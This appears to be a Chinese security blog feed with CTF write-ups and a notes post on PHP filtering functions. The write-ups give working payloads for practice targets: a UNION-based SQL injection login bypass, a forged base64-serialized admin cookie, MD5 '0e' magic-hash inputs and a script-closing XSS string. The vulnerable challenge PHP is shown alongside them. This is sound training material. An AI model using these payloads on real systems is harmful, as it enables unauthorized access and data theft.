<p><img src="http://obr4sfdq7.bkt.clouddn.com/%E7%81%AB%E6%98%9F%E6%96%872.png" alt=""></p>
<p>A跑出来是一串密文，B跑出来是一个解密脚本</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/base6.png" alt=""></p>
<h2 id="用户登录-100"><a href="#用户登录-100" class="headerlink" title="用户登录 100"></a>用户登录 100</h2><h3 id="题目链接-1"><a href="#题目链接-1" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28002/" target="_blank" rel="external">http://47.100.121.220:28002/</a></p>
<h3 id="基本知识"><a href="#基本知识" class="headerlink" title="基本知识"></a>基本知识</h3><p>mysql_query() 函数</p>
<p>mysql_query() 函数执行一条 MySQL 查询。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql_query(query,connection)</div></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>query</td>
<td style="text-align:center">必需。规定要发送的 SQL 查询。注释：查询字符串不应以分号结束。</td>
</tr>
<tr>
<td>connection</td>
<td style="text-align:center">可选。规定 SQL 连接标识符。如果未规定，则使用上一个打开的连接。</td>
</tr>
</tbody>
</table>
<p>mysql_fetch_array() 函数</p>
<p>mysql_fetch_array() 函数从结果集中取得一行作为关联数组，或数字数组，或二者兼有<br>返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql_fetch_array(data,array_type)</div></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>data</td>
<td style="text-align:center">可选。规定要使用的数据指针。该数据指针是 mysql_query() 函数产生的结果。</td>
</tr>
<tr>
<td>array_type</td>
<td style="text-align:center">可选。规定返回哪种结果。可能的值：MYSQL_ASSOC - 关联数组 MYSQL_NUM - 数字数组 MYSQL_BOTH - 默认。同时产生关联和数字数组</td>
</tr>
</tbody>
</table>
<p>strcasecmp() 函数</p>
<p>strcasecmp() 函数比较两个字符串。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">strcasecmp(string1,string2)</div></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>string1</td>
<td style="text-align:center">必需。规定要比较的第一个字符串。</td>
</tr>
<tr>
<td>string2</td>
<td style="text-align:center">必需。规定要比较的第二个字符串。</td>
</tr>
</tbody>
</table>
<p>以上是本题涉及到的几个函数。</p>
<h3 id="解答-1"><a href="#解答-1" class="headerlink" title="解答"></a>解答</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">include &quot;config.php&quot;;</div><div class="line">include &quot;flag.php&quot;;</div><div class="line"></div><div class="line">show_source(__FILE__);</div><div class="line">if( isset($_POST[&quot;user&quot;]) &amp;&amp; isset($_POST[&quot;pass&quot;])) &#123;</div><div class="line">    $user = $_POST[&quot;user&quot;];</div><div class="line">    $pass = md5($_POST[&quot;pass&quot;]);</div><div class="line">    $auth = false;</div><div class="line">    </div><div class="line">    $conn = mysql_connect($db_host, $db_user, $db_pass) or die(&quot;Unable to connect!&quot;);</div><div class="line">    mysql_select_db($db_name) or die(&quot;Unable to select database!&quot;);</div><div class="line">    </div><div class="line">    $sql = &quot;select password from user where user=&apos;$user&apos;&quot;;</div><div class="line">    $query = mysql_query($sql);</div><div class="line">    if(!$query) &#123;</div><div class="line">        mysql_close($conn);</div><div class="line">        die(&quot;login failed!&quot;);</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    $row = mysql_fetch_array($query, MYSQL_ASSOC);</div><div class="line">    if($row[&quot;password&quot;] &amp;&amp; !strcasecmp($pass,$row[&quot;password&quot;])) &#123;</div><div class="line">        $auth = true;</div><div class="line">    &#125;</div><div class="line">    mysql_close($conn);</div><div class="line">    </div><div class="line">    if($auth) &#123;</div><div class="line">        echo &quot;login success!&quot;;</div><div class="line">        echo $flag;</div><div class="line">    &#125;</div><div class="line">    else &#123;</div><div class="line">        die(&quot;login failed!&quot;);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$sql = &quot;select password from user where user=&apos;$user&apos;</div></pre></td></tr></table></figure>
<p>是存在SQL注入的，但是用户名和密码是分开判断。所以普通的万能密码是不行的。</p>
<p>\$row[“password”]的值是从$sql提取出来的,<br>然后经过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$row[&quot;password&quot;] &amp;&amp; !strcasecmp($pass,$row[&quot;password&quot;])</div></pre></td></tr></table></figure></p>
<p>进行密码判断。</p>
<p>我们可以构造如下payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos;AND 0=1 UNION SELECT md(1) #</div></pre></td></tr></table></figure>
<p>拼接到\$sql<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$sql = &quot;select password from user where user=&apos;&apos;AND 0=1 UNION SELECT md5(1) #&quot;</div></pre></td></tr></table></figure></p>
<ol>
<li>最前面的单引号：闭合原文的where user=’</li>
<li>AND 0=1:为了使前面的表达式返回值为空.</li>
<li>接着我们使用UNION SELECT MD5(1)，直接把MD5值作为返回值returned给\$sql，这样在查询的时候\$query就会有值.</li>
<li>最后的#用来注释掉后面没用的东西</li>
</ol>
<p>因此<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">username:&apos; and 0=1 union select md5(1)#</div><div class="line">password:1</div></pre></td></tr></table></figure></p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/sqlsql.png" alt=""></p>
<h2 id="You-have-no-permissions-150"><a href="#You-have-no-permissions-150" class="headerlink" title="You have no permissions 150"></a>You have no permissions 150</h2><h3 id="题目链接-2"><a href="#题目链接-2" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28003/03.php" target="_blank" rel="external">http://47.100.121.220:28003/03.php</a></p>
<h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>implode() 函数</p>
<p>implode() 函数返回由数组元素组合成的字符串。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">implode(separator,array)</div></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>separator</td>
<td style="text-align:center">可选。规定数组元素之间放置的内容。默认是 “”（空字符串）。</td>
</tr>
<tr>
<td>array</td>
<td style="text-align:center">必需。要组合为字符串的数组。</td>
</tr>
</tbody>
</table>
<h3 id="解答-2"><a href="#解答-2" class="headerlink" title="解答"></a>解答</h3><p>这个题目是绕了一点弯的，周六我做这个题是一点思路没有的</p>
<p>今天重新看了这个题，数据包里只有一个role的cookies。</p>
<p>经过一顿操作，发现这个是base64加密的，解密得到s:5:”guest”;</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/guest.png" alt=""></p>
<p>s:5:”guest”,看起来像一个序列化后的数据，这里我们把guest改成admin试试，admin的长度也是5</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/adminbase64.png" alt=""></p>
<p>得到了czo1OiJhZG1pbiI7，替换cookie传入，进入终于有权限了。得到一份源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$role = &quot;guest&quot;;</div><div class="line">$flag = &quot;flag&#123;xxxxxx&#125;&quot;;</div><div class="line">$auth = false;</div><div class="line">if(isset($_COOKIE[&quot;role&quot;])) &#123;</div><div class="line">    if(&quot;admin&quot;===unserialize(base64_decode($_COOKIE[&quot;role&quot;])))</div><div class="line">    &#123;</div><div class="line">        $auth = true;</div><div class="line">        echo &quot;Hello admin, now you can upload something you are easy to forget.&lt;/br&gt;&quot;;</div><div class="line">        echo &quot;there are ther source.&lt;/br&gt;&quot;;</div><div class="line">        </div><div class="line">        if(isset($_POST[&quot;key1&quot;])) &#123;</div><div class="line">            $key1 = $_POST[&quot;key1&quot;];</div><div class="line">            $md51 = @md5($key1);</div><div class="line">            $md52 = @md5(&apos;s155964671a&apos;);</div><div class="line">            if(&apos;s155964671a&apos;!=$key1 &amp;&amp; $md51==$md52) &#123;</div><div class="line">                if(isset($_POST[&quot;data&quot;])) &#123;</div><div class="line">                    $data = $_POST[&quot;data&quot;];</div><div class="line">                    $b1 = preg_match(&apos;/[&lt;&gt;?]/&apos;,$data);     //0</div><div class="line">                    $s = implode(&quot;&quot;,$data);</div><div class="line">                    $b2 = preg_match(&apos;/[&lt;&gt;?]/&apos;,$s);   //1</div><div class="line">                    </div><div class="line">                    if(!$b1 &amp;&amp; $b2 ) die($flag);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        </div><div class="line">        $myfile = fopen(&quot;03.php&quot;, &quot;r&quot;) or die(&quot;Unable to open file!&quot;);</div><div class="line">        $text = fread($myfile,filesize(&quot;03.php&quot;));</div><div class="line">        fclose($myfile);</div><div class="line">        $text = str_replace(&quot;xxxxxx&quot;,&quot;xxxxxx&quot;,$text);</div><div class="line">        echo &apos;&lt;textarea rows=&quot;10&quot; cols=&quot;40&quot; style=&quot;resize:none&quot; &gt;&apos;;</div><div class="line">        echo $text;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">if(!$auth) &#123;</div><div class="line">    setcookie(&quot;role&quot;,&quot;czo1OiJndWVzdCI7&quot;);</div><div class="line">    echo &quot;Sory.You have no permissions.&quot;;</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>分析代码，先看MD5这一块</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">if(isset($_POST[&quot;key1&quot;])) &#123;</div><div class="line">    $key1 = $_POST[&quot;key1&quot;];</div><div class="line">    $md51 = @md5($key1);</div><div class="line">    $md52 = @md5(&apos;s155964671a&apos;);</div><div class="line">    if(&apos;s155964671a&apos;!=$key1 &amp;&amp; $md51==$md52)</div></pre></td></tr></table></figure>
<p>这里是利用PHP语言的弱类型特征：</p>
<ul>
<li>1）将s155964671a进行MD5加密，密文为0e342768416822451524974117254469，发现密文为0e开头，PHP在进行比较运算时，如果遇到了0e\d+这种字符串，就会将这种字符串解析为科学计数法。 </li>
<li>2）因为0exx都等于0，所以让两者相等我们只需再找到一个MD5加密后开头为0e的字符串即可 </li>
<li>3）相关字符串：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">md5(&apos;s878926199a&apos;)=0e545993274517709034328855841020</div><div class="line">md5(&apos;QNKCDZO&apos;)=0e342768416822451524974117254469</div></pre></td></tr></table></figure>
<p>这里我们就可以构造一个key变量，key的传入值为QNKCDZO或者s878926199a</p>
<p>继续看后面的代码，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">if(isset($_POST[&quot;data&quot;])) &#123;</div><div class="line">    $data = $_POST[&quot;data&quot;];</div><div class="line">    $b1 = preg_match(&apos;/[&lt;&gt;?]/&apos;,$data);     //0</div><div class="line">    $s = implode(&quot;&quot;,$data);</div><div class="line">    $b2 = preg_match(&apos;/[&lt;&gt;?]/&apos;,$s);   //1</div><div class="line">    </div><div class="line">    if(!$b1 &amp;&amp; $b2 ) die($flag);</div></pre></td></tr></table></figure>
<p>impode函数是把数组的元素组成字符串的，如注释\$b1需要返回0，\$b2需要返回1.</p>
<p>简单的做了个测试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$data = array(&quot;/[&lt;&gt;?]/&quot;); </div><div class="line">if($item = preg_match(&quot;/[&lt;&gt;?]/&quot;,$data))&#123;</div><div class="line"> echo &apos;1&lt;hr /&gt;&apos;; </div><div class="line">&#125;else &#123; </div><div class="line"> echo &apos;0&lt;hr /&gt;&apos;; </div><div class="line">&#125; </div><div class="line"></div><div class="line">$s = implode(&quot;&quot;,$data);</div><div class="line">echo $s ;</div><div class="line">echo &apos;&lt;hr /&gt;&apos;;</div><div class="line">if($b2 = preg_match(&apos;/[&lt;&gt;?]/&apos;,$s))</div><div class="line">&#123;</div><div class="line">	</div><div class="line"> echo &apos;1&lt;hr /&gt;&apos;; </div><div class="line">&#125;else &#123; </div><div class="line"> echo &apos;0&lt;hr /&gt;&apos;; </div><div class="line">&#125; </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/tesrceshi.png" alt=""></p>
<p>可以看出来，传入一个[&lt;&gt;?]是可以直接得到我们想要的返回值的。但是直接传data=[&lt;&gt;?]是不行的</p>
<p>这里我们可以这样传入 data[]=[&lt;&gt;?] 当做一个数组传入，符合了代码的意思</p>
<p>再做一个简单的测试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">var_dump( $_POST[&quot;a&quot;]);</div><div class="line">echo &apos;&lt;br&gt;&apos;;</div><div class="line">print_r( $_POST[&quot;a&quot;]);</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/shuzuceshi.png" alt=""></p>
<p>这里我们可以看出我们这样传参就是传入了一个数组了。</p>
<p>最后的payload就是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Cookie: role=czo1OiJhZG1pbiI7</div><div class="line"></div><div class="line">POST:</div><div class="line">key1=s878926199a&amp;data[]=[&lt;&gt;?]</div></pre></td></tr></table></figure>
<p>得到flag</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/flag11111111.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://uknowsec.cn/categories/ctf/"/>
    
    
  </entry>
  
  <entry>
    <title>php内置过滤函数总结</title>
    <link href="http://uknowsec.cn/posts/notes/php%E5%86%85%E7%BD%AE%E8%BF%87%E6%BB%A4%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93.html"/>
    <id>http://uknowsec.cn/posts/notes/php内置过滤函数总结.html</id>
    <published>2017-11-20T07:56:31.000Z</published>
    <updated>2017-11-20T10:00:57.482Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<p>PHP本身内置了很多参数过滤的函数，以方便开发者简单有效且统一地进行安全防护，而这些函数可以分为多种类型，如SQL注入过滤函数，XSS过滤函数，命令执行过滤函数，代码执行过滤函数等等。</p>
<h2 id="SQL注入过滤函数"><a href="#SQL注入过滤函数" class="headerlink" title="SQL注入过滤函数"></a>SQL注入过滤函数</h2><p>SQL注入过滤函数有addslashes(),mysql_real_escape_string()以及mysql_escape_string(),它们的作用都是给字符串添加反斜杠（\）来转义掉单引号（’）、双引号（”）以及空格符NULL。</p>
<p>addslashes()和mysql_escape_string()函数都是直接在敏感字符串前加反斜杠，可能会存在宽字节注入。可参考我之前的博客</p>
<p><a href="http://uknowsec.cn/posts/notes/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html">宽字节注入漏洞的利用与学习</a></p>
<p>而mysql_real_escape_string()函数会考虑当前连接数据库的字符集编码。</p>
<h3 id="addslashes"><a href="#addslashes" class="headerlink" title="addslashes()"></a>addslashes()</h3><p>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</p>
<p>预定义字符是：</p>
<ul>
<li>单引号（’）</li>
<li>双引号（”）</li>
<li>反斜杠（\）</li>
<li>NULL</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">addslashes(string)</div></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>string</td>
<td style="text-align:center">必需。规定要转义的字符串。</td>
</tr>
</tbody>
</table>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">$id=$_GET[&quot;id&quot;];</div><div class="line"></div><div class="line">$str = addslashes($id);</div><div class="line"></div><div class="line">echo $str;</div><div class="line"></div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/addslashes%28%291.png" alt=""></p>
<h3 id="mysql-escape-string"><a href="#mysql-escape-string" class="headerlink" title="mysql_escape_string()"></a>mysql_escape_string()</h3><p>在PHP5.3中已经弃用mysql_escape_string()</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql_escape_string()并不转义%和_</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">$id=$_GET[&quot;id&quot;];</div><div class="line"></div><div class="line">$str = mysql_escape_string($id);</div><div class="line"></div><div class="line">echo $str;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/mysql_escape_string.png" alt=""></p>
<h3 id="mysql-real-escape-string"><a href="#mysql-real-escape-string" class="headerlink" title="mysql_real_escape_string()"></a>mysql_real_escape_string()</h3><p>mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。</p>
<p>下列字符受影响：</p>
<ul>
<li>\x00</li>
<li>\n</li>
<li>\r</li>
<li>\</li>
<li>‘</li>
<li>“</li>
<li>\x1a</li>
</ul>
<p>如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql_real_escape_string(string,connection)</div></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>string</td>
<td style="text-align:center">必需。规定要转义的字符串。</td>
</tr>
<tr>
<td>connection</td>
<td style="text-align:center">可选。规定 MySQL 连接。如果未规定，则使用上一个连接。</td>
</tr>
</tbody>
</table>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">$id=$_GET[&quot;id&quot;];</div><div class="line"></div><div class="line">if($str = mysql_real_escape_string($id))</div><div class="line">	echo $str;</div><div class="line">else</div><div class="line">	echo &apos;false&apos;;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/mysql_real_escape_string.png" alt=""></p>
<h2 id="XSS过滤函数"><a href="#XSS过滤函数" class="headerlink" title="XSS过滤函数"></a>XSS过滤函数</h2><p>XSS过滤函数有htmlspecialchars()和strip_tags()</p>
<h3 id="htmlspecialchars"><a href="#htmlspecialchars" class="headerlink" title="htmlspecialchars()"></a>htmlspecialchars()</h3><p>htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。</p>
<p>预定义的字符是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&amp;转换成&amp;amp</div><div class="line">&quot;转换成&amp;quot</div><div class="line">&apos;转换成&amp;#039</div><div class="line">&lt;转换成&amp;lt</div><div class="line">&gt;转换成&amp;gt</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">$id=$_GET[&quot;id&quot;];</div><div class="line"></div><div class="line">$str = htmlspecialchars($id);</div><div class="line"></div><div class="line">echo $str;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/htmlspecialchars.png" alt=""></p>
<h3 id="strip-tag-函数"><a href="#strip-tag-函数" class="headerlink" title="strip_tag()函数"></a>strip_tag()函数</h3><p>strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">strip_tags(string,allow)</div></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>string</td>
<td style="text-align:center">必需。规定要检查的字符串。</td>
</tr>
<tr>
<td>allow</td>
<td style="text-align:center">可选。规定允许的标签。这些标签不会被删除。</td>
</tr>
</tbody>
</table>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">$id=$_GET[&quot;id&quot;];</div><div class="line"></div><div class="line">$str = strip_tags($id);</div><div class="line"></div><div class="line">echo $str;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/strip_tag.png" alt=""></p>
<h2 id="命令执行过滤函数"><a href="#命令执行过滤函数" class="headerlink" title="命令执行过滤函数"></a>命令执行过滤函数</h2><p>PHP提供了escapeshellcmd()和escapeshellarg()两个函数对参数进行过滤</p>
<h3 id="escapeshellcmd"><a href="#escapeshellcmd" class="headerlink" title="escapeshellcmd()"></a>escapeshellcmd()</h3><p>在Windows下过滤方式是在字符前面加上一个^符号<br>在Linux是在字符前加上反斜杠（\）</p>
<p>过滤字符如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">&amp;</div><div class="line">;</div><div class="line">`</div><div class="line">|</div><div class="line">*</div><div class="line">?</div><div class="line">~</div><div class="line">&lt;</div><div class="line">&gt;</div><div class="line">^</div><div class="line">(</div><div class="line">)</div><div class="line">[</div><div class="line">]</div><div class="line">&#123;</div><div class="line">&#125;</div><div class="line">$</div><div class="line">\</div><div class="line">\</div><div class="line">x0A</div><div class="line">\xFF</div><div class="line">%</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">$id=$_GET[&quot;id&quot;];</div><div class="line"></div><div class="line">$str = escapeshellcmd($id);</div><div class="line"></div><div class="line">echo $str;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/escapeshellcmd.png" alt=""></p>
<h3 id="escapeshellarg"><a href="#escapeshellarg" class="headerlink" title="escapeshellarg()"></a>escapeshellarg()</h3><p>给所有参数加上一对双引号，强制为字符串</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">$id=$_GET[&quot;id&quot;];</div><div class="line"></div><div class="line">$str = escapeshellarg($id);</div><div class="line"></div><div class="line">echo $str;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/escapeshellarg.png" alt=""></p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://www.cnseay.com/4239/" target="_blank" rel="external">《代码审计：企业级web代码安全架构》</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="笔记" scheme="http://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>week 1 for cnas writeup</title>
    <link href="http://uknowsec.cn/posts/ctf/week-1-for-cnas-writeup.html"/>
    <id>http://uknowsec.cn/posts/ctf/week-1-for-cnas-writeup.html</id>
    <published>2017-11-18T01:47:00.000Z</published>
    <updated>2017-11-18T10:25:17.086Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>昨天晚上在暑假实习部门群里，前辈说以后每周发三个CTF的题目，再加上自己最近也想做做CTF的题，遂早上起来把题目做了下，写下writeup记录。</p>
<h2 id="alert"><a href="#alert" class="headerlink" title="alert"></a>alert</h2><h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28001/01.php" target="_blank" rel="external">http://47.100.121.220:28001/01.php</a></p>
<h3 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h3><p>这是一个简单的xss题，首先审查下元素，任意输入一个值。</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/xss1.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">	document.write(&quot;HELLO 1&lt;/br&gt;&quot;)</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
<p>可以看到输入的值1被加到了document.write函数中输出，这里只需要把document.write的script标签闭合，再插入一个xss payload即可、</p>
<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;/script&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;</div></pre></td></tr></table></figure>
